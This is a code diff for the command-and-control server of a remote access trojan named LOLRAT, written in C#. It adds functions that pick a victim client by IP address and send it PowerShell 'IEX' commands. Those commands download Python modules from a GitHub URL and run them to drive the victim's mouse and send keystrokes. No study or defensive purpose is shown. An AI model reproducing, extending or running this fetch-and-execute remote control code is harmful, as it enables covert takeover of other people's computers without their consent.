@@ -207,11 +207,23 @@ namespace LOLRAT_C2
         //                        Mouse and keyboard control
         //
         // ---------------------------------------------------------------------------
-        public void ExecuteMouseClick(int X, int Y, string Type)
+        public void ExecuteMouseClick(int X, int Y, string Type, string ClientIPAddress)
         {
             // Execute a mouse click on the current client
             if (dgvClients.SelectedRows.Count > 0)
             {
+                // Iterate through all rows in dgvClients and search for the client with the ClientIPAddress
+                foreach (DataGridViewRow row in dgvClients.Rows)
+                {
+                    if (row.Cells["IP"].Value.ToString() == ClientIPAddress)
+                    {
+                        // Select the row with the client
+                        row.Selected = true;
+                        break;
+                    }
+                }
+
+                // Get the selected row details for later transmission
                 DataGridViewRow selectedRow = dgvClients.SelectedRows[0];
                 string clientIP = selectedRow.Cells["IP"].Value.ToString();
                 int clientPort = int.Parse(selectedRow.Cells["Port"].Value.ToString());
@@ -219,11 +231,8 @@ namespace LOLRAT_C2
 
                 if (selectedClient != null)
                 {
-                    //byte[] data = Encoding.ASCII.GetBytes($"exec$powershell -c \"IEX 'python -c (Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/WilleLX1/LOLRAT/main/Modules/ControlMouse.py\").Content {X} {Y} {Type}'\"");
-                    //selectedClient.Stream.Write(data, 0, data.Length);
-                    txtCommand.Text = $"exec$powershell -c \"IEX 'python -c (Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/WilleLX1/LOLRAT/main/Modules/ControlMouse.py\").Content {X} {Y} {Type}'\"";
-                    // Press the btnSend button
-                    btnSend.PerformClick();
+                    byte[] data = Encoding.ASCII.GetBytes($"exec$powershell -c \"IEX 'python -c (Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/WilleLX1/LOLRAT/main/Modules/ControlMouse.py\").Content {X} {Y} {Type}'\"");
+                    selectedClient.Stream.Write(data, 0, data.Length);
                     txtOutput.AppendText($"Sent {Type}-click to client at X: {X}, Y: {Y}!\r\n");
                 }
                 else
@@ -237,7 +246,45 @@ namespace LOLRAT_C2
             }
         }
 
+        public void ExecuteKeyboardClick(string Key, string ClientIPAddress)
+        {
+            // Execute a mouse click on the current client
+            if (dgvClients.SelectedRows.Count > 0)
+            {
+                // Iterate through all rows in dgvClients and search for the client with the ClientIPAddress
+                foreach (DataGridViewRow row in dgvClients.Rows)
+                {
+                    if (row.Cells["IP"].Value.ToString() == ClientIPAddress)
+                    {
+                        // Select the row with the client
+                        row.Selected = true;
+                        break;
+                    }
+                }
 
+                // Get the selected row details for later transmission
+                DataGridViewRow selectedRow = dgvClients.SelectedRows[0];
+                string clientIP = selectedRow.Cells["IP"].Value.ToString();
+                int clientPort = int.Parse(selectedRow.Cells["Port"].Value.ToString());
+                ClientInfo selectedClient = FindClientByIPAndPort(clientIP, clientPort);
+
+                if (selectedClient != null)
+                {
+                    byte[] data = Encoding.ASCII.GetBytes($"exec$powershell -c \"IEX 'python -c (Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/WilleLX1/LOLRAT/main/Modules/ControlKeyboard.py\").Content {Key}'\"");
+                    selectedClient.Stream.Write(data, 0, data.Length);
+                    txtOutput.AppendText($"exec$powershell -c \"IEX 'python -c (Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/WilleLX1/LOLRAT/main/Modules/ControlKeyboard.py\").Content {Key}'\"");
+                    txtOutput.AppendText($"Sent \"{Key}\" keystoke to client!\r\n");
+                }
+                else
+                {
+                    MessageBox.Show("Selected client is null. Check FindClientByIPAndPort implementation.");
+                }
+            }
+            else
+            {
+                MessageBox.Show("No rows selected in the DataGridView.");
+            }
+        }
 
         // ---------------------------------------------------------------------------
         //
